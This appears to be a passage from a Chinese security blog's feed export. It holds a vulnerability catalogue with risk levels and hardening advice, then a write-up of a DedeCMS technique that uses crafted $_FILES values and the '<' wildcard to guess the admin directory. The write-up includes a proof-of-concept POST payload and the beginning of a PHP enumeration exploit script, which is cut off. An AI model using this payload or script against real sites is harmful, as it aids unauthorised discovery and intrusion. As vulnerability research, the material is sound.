font-size="14px">高危</font><br><strong>漏洞描述：</strong><br>由于很多操作系统或者网络设备的SNMP代理服务存在可读默认口令。如果这些默认口令没有修改或者为弱口令，远程攻击者就可以通过SNMP代理获取系统的很多细节信息。如果攻击者得到了可写口令，它甚至可以修改系统文件或者执行系统命令。<br><strong>加固建议：</strong><br>针对SNMP信息泄露漏洞，建议修改SNMP缺省口令或者关闭SNMP服务。</p><h2 id="FTP开启匿名登录"><a href="#FTP开启匿名登录" class="headerlink" title="FTP开启匿名登录"></a>FTP开启匿名登录</h2><p><strong>风险级别：</strong><font color="#ff0000"  font-size="14px">高危</font><br><strong>漏洞描述：</strong><br>攻击者可利用弱口令或匿名登录漏洞直接登录 FTP 服务，上传恶意文件，从而获取系统权限，并可能造成数据泄露。<br><strong>加固建议：</strong><br>FTP服务为明文传输，建议使用SFTP代替，如需要继续休使用建议，禁止匿名登录，设置口令为8位以上大小写字母、数字、特殊符号组合，并定期更换密码，避免使用弱口令。</p><h2 id="会话劫持漏洞"><a href="#会话劫持漏洞" class="headerlink" title="会话劫持漏洞"></a>会话劫持漏洞</h2><p><strong>风险级别：</strong><font color="#ffc000"  font-size="14px">中危</font><br><strong>漏洞描述：</strong><br>攻击者通过暴力破解、预测或者窃取（网络嗅探/XSS攻击）等方式获取用户Session ID后，使用该Session ID登录目标账号的攻击方法。<br><strong>加固建议：</strong><br>1.更改Session名称。PHP中Session的默认名称是PHPSESSID，此变量会保存在Cookie中，如果攻击者不分析站点，就不能猜到Session名称，阻挡部分攻击。<br>2.关闭透明化Session ID。透明化Session ID指当浏览器中的Http请求没有使用Cookie来存放Session ID时，Session ID则使用URL来传递。<br>3.设置HttpOnly。通过设置Cookie的HttpOnly为true，可以防止客户端脚本访问这个Cookie，从而有效的防止XSS攻击。<br>4.关闭所有phpinfo类dump request信息的页面。<br>5.使用User-Agent检测请求的一致性。但有专家警告不要依赖于检查User-Agent的一致性。这是因为服务器群集中的HTTP代理服务器会对User-Agent进行编辑，而本群集中的多个代理服务器在编辑该值时可能会不一致。</p><h2 id="会话固定漏洞"><a href="#会话固定漏洞" class="headerlink" title="会话固定漏洞"></a>会话固定漏洞</h2><p><strong>风险级别：</strong><font color="#ffc000"  font-size="14px">中危</font><br><strong>漏洞描述：</strong><br>会话固定也可以看成是会话劫持的一种类型，原因是会话固定的攻击的主要目的同样是获得目标用户的合法会话，不过会话固定还可以是强迫受害者使用攻击者设定的一个有效会话，以此来获得用户的敏感信息。<br><strong>加固建议：</strong><br>1.用户登录时生成新的Session ID。如果攻击者使用的会话标识符不是有效的，那么这种方式将会非常有效。如果不是有效的会话标识符，服务器将会要求用户重新登录。如果攻击者使用的是有效的Session ID，那么还可以通过校验的方式来避免攻击。<br>2.大部分防止会话劫持的方法对会话固定攻击同样有效。如设置HttpOnly，关闭透明化Session ID，User-Agent验证，Token校验等。</p><h2 id="会话cookie中缺少HttpOnly属性"><a href="#会话cookie中缺少HttpOnly属性" class="headerlink" title="会话cookie中缺少HttpOnly属性"></a>会话cookie中缺少HttpOnly属性</h2><p><strong>风险级别：</strong><font color="#00b0f0"  font-size="14px">低危</font><br><strong>漏洞描述：</strong><br>如不设置此属性，攻击者可配合跨站脚本盗取cookie。设置此属性，即使有跨站漏洞存在，也很难利用。<br><strong>加固建议：</strong><br>在服务器端设置cookie的HttpOnly属性为真。</p><h2 id="未禁用密码表单自动完成属性"><a href="#未禁用密码表单自动完成属性" class="headerlink" title="未禁用密码表单自动完成属性"></a>未禁用密码表单自动完成属性</h2><p><strong>风险级别：</strong><font color="#00b0f0"  font-size="14px">低危</font><br><strong>漏洞描述：</strong><br>自动填写未对密码字段禁用的 HTML 属性。<br><strong>加固建议：</strong><br>将“autocomplete”属性正确设置为“off”。</p><h2 id="会话cookie中缺少secure属性"><a href="#会话cookie中缺少secure属性" class="headerlink" title="会话cookie中缺少secure属性"></a>会话cookie中缺少secure属性</h2><p><strong>风险级别：</strong><font color="#00b0f0"  font-size="14px">低危</font><br><strong>漏洞描述：</strong><br>可能会窃取在加密的会话期间发送的用户和会话信息。<br><strong>加固建议：</strong><br>服务器开启了Https时，cookie的Secure属性应设为true</p><h2 id="未授权访问"><a href="#未授权访问" class="headerlink" title="未授权访问"></a>未授权访问</h2><p><strong>风险级别：</strong><font color="#ff0000"  font-size="14px">高危</font><br><strong>漏洞描述：</strong><br>后台页面或者其他用户页面没有做session认证，导致可以无需登录，直接访问页面。<br><strong>加固建议：</strong><br>对未授权访问页面做session认证，严格审核后台功能页面的访问权限，若为未登录用户则拒绝访问。</p><h2 id="越权漏洞"><a href="#越权漏洞" class="headerlink" title="越权漏洞"></a>越权漏洞</h2><p><strong>风险级别：</strong><font color="#ff0000"  font-size="14px">高危</font><br><strong>漏洞描述：</strong><br>水平越权：攻击者能够执行与自己同级别权限用户的操作<br>垂直越权：攻击者能够执行高级别权限用户的操作，比如管理员的相关操作。<br><strong>加固建议：</strong><br>1.设计严格的权限控制系统，对于每个请求和URL都要进行校验和权限确认，防止非法请求被执行；<br>2.默认情况下，应该拒绝执行所有访问权限，也就是说缺省不给用户任何权限，防止攻击者利用缺省权限执行攻击等；<br>3.对于每个功能的访问，都要有明确的角色授权，防止黑客利用不完善的访问控制缺陷造成不必要的损失；<br>或者是实现Web访问的IP白名单列表，或者是只允许属于管理员范围权利的指定IP访问等等。</p><h2 id="任意用户密码重置漏洞"><a href="#任意用户密码重置漏洞" class="headerlink" title="任意用户密码重置漏洞"></a>任意用户密码重置漏洞</h2><p><strong>风险级别：</strong><font color="#ff0000"  font-size="14px">高危</font><br><strong>漏洞描述：</strong><br>系统在处理重置密码请求时使用本地验证方法，未在服务端处理，造成用户可在本地修改数据包，绕过系统身份验证，达到重置任意账号的目的。<br><strong>加固建议：</strong><br>针对任意用户密码重置漏洞，建议在服务器端加强逻辑验证。</p><h2 id="验证码漏洞"><a href="#验证码漏洞" class="headerlink" title="验证码漏洞"></a>验证码漏洞</h2><p><strong>风险级别：</strong><font color="#ff0000"  font-size="14px">高危</font><br><strong>漏洞描述：</strong><br>验证码可以一次多用，导致可以暴力破解；<br>验证码没有限定次数和时间，导致可以无限制的发送验证码。<br><strong>加固建议：</strong><br>设置验证码登录一次，变换一次，防止暴力破解；设置验证码120秒只发送一次。</p><h2 id="暴力破解漏洞（登录页面密码猜测攻击）"><a href="#暴力破解漏洞（登录页面密码猜测攻击）" class="headerlink" title="暴力破解漏洞（登录页面密码猜测攻击）"></a>暴力破解漏洞（登录页面密码猜测攻击）</h2><p><strong>风险级别：</strong><font color="#ffc000"  font-size="14px">中危</font><br><strong>漏洞描述：</strong><br>登录入口没有验证码或者验证码可以一次多用，导致可以暴力破解。攻击者可能试图尝试每个可能的字母，数字和符号组合，或使用一些暴力破解工具进行猜测，直到它发现了一个正确的组合，从而进入登录页面做进一步深度非法攻击。<br><strong>加固建议：</strong><br>1.增加验证码，使之登录失败一次，验证码变换一次。<br>2.针对密码猜测，建议控制错误登录次数，以防止暴力破解。同一用户如果5分钟内登录失败6次，禁用此用户登录30分钟。</p><h2 id="用户名猜解漏洞"><a href="#用户名猜解漏洞" class="headerlink" title="用户名猜解漏洞"></a>用户名猜解漏洞</h2><p><strong>风险级别：</strong><font color="#ffc000"  font-size="14px">中危</font><br><strong>漏洞描述：</strong><br>通过登录信息可以判断有无此用户，可以对用户名进行猜解。<br><strong>加固建议：</strong><br>使用模糊的错误登录提示，如：用户名或密码错误。</p><h2 id="短信轰炸漏洞"><a href="#短信轰炸漏洞" class="headerlink" title="短信轰炸漏洞"></a>短信轰炸漏洞</h2><p><strong>风险级别：</strong><font color="#ffc000"  font-size="14px">中危</font><br><strong>漏洞描述：</strong><br>短信轰炸是由于系统设计缺陷可无限制发送短信验证码给客户端，攻击者可利用该漏洞对任意手机号码进行短信轰炸，对公司造成不良影响和运行安全风险。<br><strong>加固建议：</strong><br>建议针对发送短信验证码接口加强权限控制，在服务端限制单位时间内发送短信次数。</p><h2 id="Webview远程代码执行漏洞"><a href="#Webview远程代码执行漏洞" class="headerlink" title="Webview远程代码执行漏洞"></a>Webview远程代码执行漏洞</h2><p><strong>风险级别：</strong><font color="#ff0000"  font-size="14px">高危</font><br><strong>漏洞描述：</strong><br>WebView组件中的addJavascriptInterface方法用于实现本地Java和JavaScript的交互，但是该函数并没有对方法调用进行限制，导致攻击者可以调用任何JAVA类，最终导致JavaScript代码对设备进行任意攻击<br><strong>加固建议：</strong><br>建议不使用addJavascriptInterface接口，对于Android API Level为17或者以上的Android系统，Google规定允许被调用的函数，必须在Java的远程方法上面声明一个@JavascriptInterface注解；在使用js2java的bridge时候，需要对每个传入的参数进行验证，避免恶意代码的攻击。</p><h2 id="代码动态加载安全检测"><a href="#代码动态加载安全检测" class="headerlink" title="代码动态加载安全检测"></a>代码动态加载安全检测</h2><p><strong>风险级别：</strong><font color="#ff0000"  font-size="14px">高危</font><br><strong>漏洞描述：</strong><br>使用DexClassLoader或PathClassLoader动态加载dex文件、apk文件、jar文件时，如果这些文件存储在可被其他应用读写的目录中(比如sdcard)，同时没有对外部加载的文件进行完整性校验，导致应用可能会被恶意代码注入并执行。<br><strong>加固建议：</strong><br>将所需要动态加载的文件放置在apk内部，或应用私有目录中；如果应用必须要把所加载的文件放置在可被其他应用读写的目录中(比如sdcard)，建议对不可信的加载源进行完整性校验和白名单处理，以保证不被恶意代码注入</p><h2 id="应用签名未校验风险"><a href="#应用签名未校验风险" class="headerlink" title="应用签名未校验风险"></a>应用签名未校验风险</h2><p><strong>风险级别：</strong><font color="#ff0000"  font-size="14px">高危</font><br><strong>漏洞描述：</strong><br>应用签名未校验，攻击者可伪造app程序。<br><strong>加固建议：</strong><br>增加程序本地签名校验及云端的签名校验</p><h2 id="篡改和二次打包风险"><a href="#篡改和二次打包风险" class="headerlink" title="篡改和二次打包风险"></a>篡改和二次打包风险</h2><p><strong>风险级别：</strong><font color="#ff0000"  font-size="14px">高危</font><br><strong>漏洞描述：</strong><br>对移动应用进行破解、再篡改或插入恶意代码，最后重新打包生成一个新应用的过程，恶意程序通过插入广告、木马、病毒的方式窃取用户隐私、吸资扣费、耗费流量等。<br><strong>加固建议：</strong><br>增加程序本地签名校验及云端的签名校验。</p><h2 id="Java代码反编译风险"><a href="#Java代码反编译风险" class="headerlink" title="Java代码反编译风险"></a>Java代码反编译风险</h2><p><strong>风险级别：</strong><font color="#ffc000"  font-size="14px">中危</font><br><strong>漏洞描述：</strong><br>可通过反编译工具获取java源代码，攻击者可获取源码信息执行更深入的渗透攻击。<br><strong>加固建议：</strong><br>1.隔离Java程序；<br>2.对Class文件进行加密；<br>3.代码混淆。</p><h2 id="资源文件泄露风险"><a href="#资源文件泄露风险" class="headerlink" title="资源文件泄露风险"></a>资源文件泄露风险</h2><p><strong>风险级别：</strong><font color="#ffc000"  font-size="14px">中危</font><br><strong>漏洞描述：</strong><br>泄露的js文件如果被读取，可能会造成功能逻辑泄露，如果被篡改，可能被植入钓鱼页面或恶意代码，造成用户的敏感信息泄露<br><strong>加固建议：</strong><br>对资源文件(.js)进行加密保护，防止资源文件泄露。</p><h2 id="Webview明文存储密码风险"><a href="#Webview明文存储密码风险" class="headerlink" title="Webview明文存储密码风险"></a>Webview明文存储密码风险</h2><p><strong>风险级别：</strong><font color="#ffc000"  font-size="14px">中危</font><br><strong>漏洞描述：</strong><br>在使用WebView的过程中忽略了WebView setSavePassword，当用户选择保存在WebView中输入的用户名和密码，则会被明文保存到应用数据目录的databases/webview.db中。如果手机被root就可以获取明文保存的密码，造成用户的个人敏感数据泄露。<br><strong>加固建议：</strong><br>使用WebView.getSettings().setSavePassword(false)来禁止保存密码</p><h2 id="明文数字证书风险"><a href="#明文数字证书风险" class="headerlink" title="明文数字证书风险"></a>明文数字证书风险</h2><p><strong>风险级别：</strong><font color="#ffc000"  font-size="14px">中危</font><br><strong>漏洞描述：</strong><br>明文存储的数字证书如果被篡改，可能会造成客户端与服务端之间的传输数据被截获并解密，造成用户信息泄露<br><strong>加固建议：</strong><br>对数字证书文件(.cer)进行加密，避免证书文件泄露</p><h2 id="应用数据任意备份风险"><a href="#应用数据任意备份风险" class="headerlink" title="应用数据任意备份风险"></a>应用数据任意备份风险</h2><p><strong>风险级别：</strong><font color="#ffc000"  font-size="14px">中危</font><br><strong>漏洞描述：</strong><br>Android 2.1 以上的系统可为App提供应用程序数据的备份和恢复功能，该由AndroidMainfest.xml文件中的allowBackup 属性值控制，其默认值为true。当该属性没有显式设置为false时,攻击者可通过adb backup 和adb restore对App的应用数据进行备份和恢复,从而可能获取明文存储的用户敏感信息，如用户的密码、证件号、手机号、交易密码、身份令牌、服务器通信记录等。利用此类信息攻击者可伪造用户身份，盗取用户账户资产，或者直接对服务器发起攻击。<br><strong>加固建议：</strong><br>关闭应用程序数据的备份和恢复功能。</p><h2 id="AES-DES加密方法不安全使用漏洞"><a href="#AES-DES加密方法不安全使用漏洞" class="headerlink" title="AES/DES加密方法不安全使用漏洞"></a>AES/DES加密方法不安全使用漏洞</h2><p><strong>风险级别：</strong><font color="#ffc000"  font-size="14px">中危</font><br><strong>漏洞描述：</strong><br>使用AES/DES/DESede加密算法时，如果使用ECB模式，容易受到攻击风险，造成信息泄露<br><strong>加固建议：</strong><br>使用AES/DES/DESede加密算法时，应显示指定使用CBC或CFB加密模式</p><h2 id="敏感函数调用风险"><a href="#敏感函数调用风险" class="headerlink" title="敏感函数调用风险"></a>敏感函数调用风险</h2><p><strong>风险级别：</strong><font color="#ffc000"  font-size="14px">中危</font><br><strong>漏洞描述：</strong><br>APP应用程序中调用了包含敏感行为的函数，包括发送短信、发送地理位置、拨打电话等，可能会导致用户隐私数据泄露等风险<br><strong>加固建议：</strong><br>开发者审核包含敏感行为的函数调用，确保其使用是必要且限制于授权用户的</p><h2 id="HTTP传输数据风险"><a href="#HTTP传输数据风险" class="headerlink" title="HTTP传输数据风险"></a>HTTP传输数据风险</h2><p><strong>风险级别：</strong><font color="#ffc000"  font-size="14px">中危</font><br><strong>漏洞描述：</strong><br>攻击者在自己设置的钓鱼网络中配置DNS服务器，将软件要连接的服务器域名解析至攻击者的另一台服务器在，这台服务器就可以获得用户登录信息，或者充当客户端与原服务器的中间人，转发双方数据。<br><strong>加固建议：</strong><br>对敏感数据采用基于SSL/TLS的HTTPS进行传输。</p><h2 id="HTTPS未校验服务器证书漏洞"><a href="#HTTPS未校验服务器证书漏洞" class="headerlink" title="HTTPS未校验服务器证书漏洞"></a>HTTPS未校验服务器证书漏洞</h2><p><strong>风险级别：</strong><font color="#ffc000"  font-size="14px">中危</font><br><strong>漏洞描述：</strong><br>虽然使用了https通信方式，但是只是简单的调用而已，并未对SSL证书有效性做验证，攻击者以轻易获取手机用户的明文通信信息。<br><strong>加固建议：</strong><br>对SSL证书进行有效性做验证</p><h2 id="Activity组件导出风险"><a href="#Activity组件导出风险" class="headerlink" title="Activity组件导出风险"></a>Activity组件导出风险</h2><p><strong>风险级别：</strong><font color="#ffc000"  font-size="14px">中危</font><br><strong>漏洞描述：</strong><br>导出的Activity组件可以被第三方APP任意调用，导致敏感信息泄露，并可能受到绕过认证、恶意代码注入等攻击风险。<br><strong>加固建议：</strong><br>如果应用的Activity组件不必要导出，或者组件配置了intent filter标签，建议显示设置组件的“android:exported”属性为false；如果组件必须要提供给外部应用使用，建议对组件进行权限控制。</p><h2 id="Service组件导出风险"><a href="#Service组件导出风险" class="headerlink" title="Service组件导出风险"></a>Service组件导出风险</h2><p><strong>风险级别：</strong><font color="#ffc000"  font-size="14px">中危</font><br><strong>漏洞描述：</strong><br>导出的Service组件可以被第三方APP任意调用，导致敏感信息泄露，并可能受到权限提升、拒绝服务等攻击风险。<br><strong>加固建议：</strong><br>如果应用的Service组件不必要导出，或者组件配置了intent filter标签，建议显示设置组件的“android:exported”属性为false；如果组件必须要提供给外部应用使用，建议对组件进行权限控制。</p><h2 id="Broadcast-Receiver组件导出风险"><a href="#Broadcast-Receiver组件导出风险" class="headerlink" title="Broadcast Receiver组件导出风险"></a>Broadcast Receiver组件导出风险</h2><p><strong>风险级别：</strong><font color="#ffc000"  font-size="14px">中危</font><br><strong>漏洞描述：</strong><br>导出的Broadcast Receiver组件可以被第三方APP任意调用，导致敏感信息泄露，并可能受到权限绕过、拒绝服务等攻击风险<br><strong>加固建议：</strong><br>如果应用的Broadcast Receiver组件不必要导出，或者组件配置了intent filter标签，建议显示设置组件的“android:exported”属性为false；如果组件必须要接收外部应用发送的消息，建议对组件进行权限控制。</p><h2 id="系统组件本地拒绝服务检测"><a href="#系统组件本地拒绝服务检测" class="headerlink" title="系统组件本地拒绝服务检测"></a>系统组件本地拒绝服务检测</h2><p><strong>风险级别：</strong><font color="#ffc000"  font-size="14px">中危</font><br><strong>漏洞描述：</strong><br>导出的组件在处理Intent附加数据的时候，没有进行异常捕获，攻击者可通过向应用发送空数据、异常或畸形数据等，导致应用程序崩溃。<br><strong>加固建议：</strong><br>不必要导出的组件，建议显示设置组件的“android:exported”属性为false；在使用Intent获取附加数据时，使用try catch进行异常捕获和处理，防止抛出异常引发崩溃。</p><h2 id="Content-Provider组件导出风险"><a href="#Content-Provider组件导出风险" class="headerlink" title="Content Provider组件导出风险"></a>Content Provider组件导出风险</h2><p><strong>风险级别：</strong><font color="#ffc000"  font-size="14px">中危</font><br><strong>漏洞描述：</strong><br>导出的Content Provider组件可以被第三方app任意调用，导致敏感信息泄露，并可能受到目录遍历、SQL注入等攻击风险<br><strong>加固建议：</strong><br>如果应用的Content Provider组件不必要导出，建议显式设置组件的“android:exported”属性为false；如果必须要有数据提供给外部应用使用，建议对组件进行权限控制。</p>]]></content>
    
    
    <summary type="html">&lt;div class=&quot;note note-success&quot;&gt;
            &lt;p&gt;人生几何，对酒当歌！&lt;/p&gt;
          &lt;/div&gt;

&lt;p&gt;&lt;code&gt;内容均来自互联网，风险等级根据实际情况定义&lt;/code&gt;&lt;/p&gt;
&lt;h2 id=&quot;SQL注入漏洞&quot;&gt;&lt;a href=&quot;#SQL注入漏洞&quot; class=&quot;headerlink&quot; title=&quot;SQL注入漏洞&quot;&gt;&lt;/a&gt;SQL注入漏洞&lt;/h2&gt;&lt;p&gt;&lt;strong&gt;风险级别：&lt;/strong&gt;&lt;font color=&quot;#ff0000&quot;  font-size=&quot;14px&quot;&gt;高危&lt;/font&gt;&lt;br&gt;&lt;strong&gt;漏洞描述：&lt;/strong&gt;&lt;br&gt;当Web应用程序未对用户输入的数据进行足够的安全处理（如危险字符过滤或者语句过滤），而直接拼接SQL语句执行时，攻击者可以精心构造参数值，使服务器执行非预期的SQL语句并返回结果，造成数据库信息泄露。利用SQL注入漏洞，攻击者可获取数据库的增、删、改、查权限，甚至执行系统命令，上传后门文件等。&lt;/p&gt;</summary>
    
    
    
    <category term="漏洞描述" scheme="http://www.secice.cn/categories/%E6%BC%8F%E6%B4%9E%E6%8F%8F%E8%BF%B0/"/>
    
    
    <category term="漏洞描述" scheme="http://www.secice.cn/tags/%E6%BC%8F%E6%B4%9E%E6%8F%8F%E8%BF%B0/"/>
    
    <category term="解决建议" scheme="http://www.secice.cn/tags/%E8%A7%A3%E5%86%B3%E5%BB%BA%E8%AE%AE/"/>
    
  </entry>
  
  <entry>
    <title>解决DEDECMS历史难题--找后台目录</title>
    <link href="http://www.secice.cn/p/40eeea0e"/>
    <id>http://www.secice.cn/p/40eeea0e</id>
    <published>2018-02-26T03:51:52.000Z</published>
    <updated>2020-11-23T09:04:26.438Z</updated>
    
    <content type="html"><![CDATA[<h3 id="利用限制"><a href="#利用限制" class="headerlink" title="利用限制"></a>利用限制</h3><ul><li>  仅针对windows系统</li></ul><h3 id="进入正题"><a href="#进入正题" class="headerlink" title="进入正题"></a>进入正题</h3><p>首先看核心文件common.inc.php 大概148行左右</p><pre><code class="hljs php"><span class="hljs-keyword">if</span>(<span class="hljs-variable">$_FILES</span>)&#123;    <span class="hljs-keyword">require_once</span>(DEDEINC.<span class="hljs-string">&#x27;/uploadsafe.inc.php&#x27;</span>);&#125;</code></pre><a id="more"></a><p>uploadsafe.inc.php</p><pre><code class="hljs php"><span class="hljs-keyword">if</span>( preg_match(<span class="hljs-string">&#x27;#^(cfg_|GLOBALS)#&#x27;</span>, <span class="hljs-variable">$_key</span>) )&#123;    <span class="hljs-keyword">exit</span>(<span class="hljs-string">&#x27;Request var not allow for uploadsafe!&#x27;</span>);&#125;<span class="hljs-variable">$$_key</span> = <span class="hljs-variable">$_FILES</span>[<span class="hljs-variable">$_key</span>][<span class="hljs-string">&#x27;tmp_name&#x27;</span>]; <span class="hljs-comment">//获取temp_name </span>$&#123;<span class="hljs-variable">$_key</span>.<span class="hljs-string">&#x27;_name&#x27;</span>&#125; = <span class="hljs-variable">$_FILES</span>[<span class="hljs-variable">$_key</span>][<span class="hljs-string">&#x27;name&#x27;</span>];$&#123;<span class="hljs-variable">$_key</span>.<span class="hljs-string">&#x27;_type&#x27;</span>&#125; = <span class="hljs-variable">$_FILES</span>[<span class="hljs-variable">$_key</span>][<span class="hljs-string">&#x27;type&#x27;</span>] = preg_replace(<span class="hljs-string">&#x27;#[^0-9a-z\./]#i&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-variable">$_FILES</span>[<span class="hljs-variable">$_key</span>][<span class="hljs-string">&#x27;type&#x27;</span>]);$&#123;<span class="hljs-variable">$_key</span>.<span class="hljs-string">&#x27;_size&#x27;</span>&#125; = <span class="hljs-variable">$_FILES</span>[<span class="hljs-variable">$_key</span>][<span class="hljs-string">&#x27;size&#x27;</span>] = preg_replace(<span class="hljs-string">&#x27;#[^0-9]#&#x27;</span>,<span class="hljs-string">&#x27;&#x27;</span>,<span class="hljs-variable">$_FILES</span>[<span class="hljs-variable">$_key</span>][<span class="hljs-string">&#x27;size&#x27;</span>]);<span class="hljs-keyword">if</span>(!<span class="hljs-keyword">empty</span>($&#123;<span class="hljs-variable">$_key</span>.<span class="hljs-string">&#x27;_name&#x27;</span>&#125;) &amp;&amp; (preg_match(<span class="hljs-string">&quot;#\.(&quot;</span>.<span class="hljs-variable">$cfg_not_allowall</span>.<span class="hljs-string">&quot;)$#i&quot;</span>,$&#123;<span class="hljs-variable">$_key</span>.<span class="hljs-string">&#x27;_name&#x27;</span>&#125;) || !preg_match(<span class="hljs-string">&quot;#\.#&quot;</span>, $&#123;<span class="hljs-variable">$_key</span>.<span class="hljs-string">&#x27;_name&#x27;</span>&#125;)) )&#123;    <span class="hljs-keyword">if</span>(!defined(<span class="hljs-string">&#x27;DEDEADMIN&#x27;</span>))    &#123;        <span class="hljs-keyword">exit</span>(<span class="hljs-string">&#x27;Not Admin Upload filetype not allow !&#x27;</span>);    &#125;&#125;<span class="hljs-keyword">if</span>(<span class="hljs-keyword">empty</span>($&#123;<span class="hljs-variable">$_key</span>.<span class="hljs-string">&#x27;_size&#x27;</span>&#125;))&#123;    $&#123;<span class="hljs-variable">$_key</span>.<span class="hljs-string">&#x27;_size&#x27;</span>&#125; = @filesize(<span class="hljs-variable">$$_key</span>);&#125;<span class="hljs-variable">$imtypes</span> = <span class="hljs-keyword">array</span>(    <span class="hljs-string">&quot;image/pjpeg&quot;</span>, <span class="hljs-string">&quot;image/jpeg&quot;</span>, <span class="hljs-string">&quot;image/gif&quot;</span>, <span class="hljs-string">&quot;image/png&quot;</span>,     <span class="hljs-string">&quot;image/xpng&quot;</span>, <span class="hljs-string">&quot;image/wbmp&quot;</span>, <span class="hljs-string">&quot;image/bmp&quot;</span>);<span class="hljs-keyword">if</span>(in_array(strtolower(trim($&#123;<span class="hljs-variable">$_key</span>.<span class="hljs-string">&#x27;_type&#x27;</span>&#125;)), <span class="hljs-variable">$imtypes</span>))&#123;    <span class="hljs-variable">$image_dd</span> = @getimagesize(<span class="hljs-variable">$$_key</span>);     <span class="hljs-comment">//问题就在这里，获取文件的size，获取不到说明不是图片或者图片不存在，不存就exit upload.... ,利用这个逻辑猜目录的前提是目录内有图片格式的文件。</span>    <span class="hljs-keyword">if</span> (!is_array(<span class="hljs-variable">$image_dd</span>))    &#123;        <span class="hljs-keyword">exit</span>(<span class="hljs-string">&#x27;Upload filetype not allow !&#x27;</span>);    &#125;&#125;......</code></pre><p>注意<code>$$_key</code>这一句，变量<code>$key</code>取自于<code>$_FILE</code>，由于<code>$_FILE</code>可控自然<code>$key</code>也可控,此处理论上是可以覆盖任意变量，但是前面有个正则判断不能出现<code>cfg_|GLOBALS</code>。(但是应该还可以覆盖其他变量此处感觉还可以深挖)</p><p>本人出发点是找个可以利用<code>&lt;&lt;</code>通配符猜解后台目录，所以只要<code>$$_key</code>参数可控就可以达到目的。</p><p>但在这之前有个<code>if(!defined(&#39;DEDEADMIN&#39;))</code>的判断,这个很好绕过设置<code>tmp_name为0或者1.jpg含.</code> 就可以绕过。</p><p>最后关键的一点就是要让文件存在还和不存在返回不同的内容就要控制type参数了。</p><p>当目录文件存在的时候 返回正常页面。当不存在的时候返回：Upload filetype not allow !</p><h3 id="举个例子"><a href="#举个例子" class="headerlink" title="举个例子"></a>举个例子</h3><p>文字不好表达，便于理解。</p><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><span class="hljs-comment">// ./dedecms/favicon.ico</span><span class="hljs-keyword">if</span>(@getimagesize(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;poc&#x27;</span>]))&#123;    <span class="hljs-keyword">echo</span> <span class="hljs-number">1</span>;&#125;<span class="hljs-keyword">else</span> &#123;    <span class="hljs-keyword">echo</span> <span class="hljs-number">0</span>;&#125;<span class="hljs-meta">?&gt;</span>get:http:<span class="hljs-comment">//localhost/test.php?poc=./d&lt;/favicon.ico</span>返回：<span class="hljs-number">1</span>http:<span class="hljs-comment">//localhost/test.php?poc=./a&lt;/favicon.ico</span>返回：<span class="hljs-number">0</span>http:<span class="hljs-comment">//localhost/test.php?poc=./de&lt;/favicon.ico</span>返回：<span class="hljs-number">1</span>http:<span class="hljs-comment">//localhost/test.php?poc=./ded&lt;/favicon.ico</span>返回：<span class="hljs-number">1</span>........</code></pre><h3 id="构造poc"><a href="#构造poc" class="headerlink" title="构造poc"></a>构造poc</h3><pre><code class="hljs sqf">http:<span class="hljs-comment">//localhost/dedecms/tags.php</span>post:dopost=save&amp;<span class="hljs-variable">_FILES</span>[b4dboy][tmp_name]=./de&lt;/images/admin_top_logo.gif&amp;<span class="hljs-variable">_FILES</span>[b4dboy][<span class="hljs-built_in">name</span>]=<span class="hljs-number">0</span>&amp;<span class="hljs-variable">_FILES</span>[b4dboy][<span class="hljs-built_in">size</span>]=<span class="hljs-number">0</span>&amp;<span class="hljs-variable">_FILES</span>[b4dboy][<span class="hljs-built_in">type</span>]=<span class="hljs-built_in">image</span>/gif</code></pre><p>Common.inc.php 是被全局包含的文件，只要文件php文件包含了Common.inc.php都可以进行测试，以tags.php文件为例</p><p>当目录存在点时候： </p><p><img src="/images/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/20180226_%E8%A7%A3%E5%86%B3DEDECMS%E5%8E%86%E5%8F%B2%E9%9A%BE%E9%A2%98--%E6%89%BE%E5%90%8E%E5%8F%B0%E7%9B%AE%E5%BD%95/01.png" alt="解决DEDECMS历史难题--找后台目录"></p><p>当目录不存在点时候： </p><p><img src="/images/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/20180226_%E8%A7%A3%E5%86%B3DEDECMS%E5%8E%86%E5%8F%B2%E9%9A%BE%E9%A2%98--%E6%89%BE%E5%90%8E%E5%8F%B0%E7%9B%AE%E5%BD%95/02.png" alt="解决DEDECMS历史难题--找后台目录"></p><h3 id="EXP："><a href="#EXP：" class="headerlink" title="EXP："></a>EXP：</h3><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><span class="hljs-variable">$domain</span>=<span class="hljs-string">&#x27;http://localhost/dedecms/&#x27;</span>;<span class="hljs-variable">$url</span>=<span class="hljs-variable">$domain</span>.<span class="hljs-string">&#x27;/index.php&#x27;</span>;<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">post</span>(<span class="hljs-params"><span class="hljs-variable">$url</span>, <span class="hljs-variable">$data</span>, <span class="hljs-variable">$cookie</span> = <span class="hljs-string">&#x27;&#x27;</span></span>) </span>&#123;    <span class="hljs-variable">$options</span> = <span class="hljs-keyword">array</span>(        CURLOPT_RETURNTRANSFER =&gt; <span class="hljs-literal">true</span>,        CURLOPT_HEADER =&gt; <span class="hljs-literal">true</span>,        CURLOPT_POST =&gt; <span class="hljs-literal">true</span>,        CURLOPT_SSL_VERIFYHOST =&gt; <span class="hljs-literal">false</span>,        CURLOPT_SSL_VERIFYHOST =&gt; <span class="hljs-literal">false</span>,        CURLOPT_COOKIE =&gt; <span class="hljs-variable">$cookie</span>,        CURLOPT_POSTFIELDS =&gt; <span class="hljs-variable">$data</span>,    );    <span class="hljs-variable">$ch</span> = curl_init(<span class="hljs-variable">$url</span>);    curl_setopt_array(<span class="hljs-variable">$ch</span>, <span class="hljs-variable">$options</span>);    <span class="hljs-variable">$result</span> = curl_exec(<span class="hljs-variable">$ch</span>);    curl_close(<span class="hljs-variable">$ch</span>);    <span class="hljs-keyword">return</span> <span class="hljs-variable">$result</span>;&#125;<span class="hljs-variable">$testlen</span>=<span class="hljs-number">25</span>;<span class="hljs-variable">$str</span>=range(<span class="hljs-string">&#x27;a&#x27;</span>,<span class="hljs-string">&#x27;z&#x27;</span>);<span class="hljs-variable">$number</span>=range(<span class="hljs-number">0</span>,<span class="hljs-number">9</span>,<span class="hljs-number">1</span>);<span class="hljs-variable">$dic</span> = array_merge(<span class="hljs-variable">$str</span>, <span class="hljs-variable">$number</span>);<span class="hljs-variable">$n</span>=<span 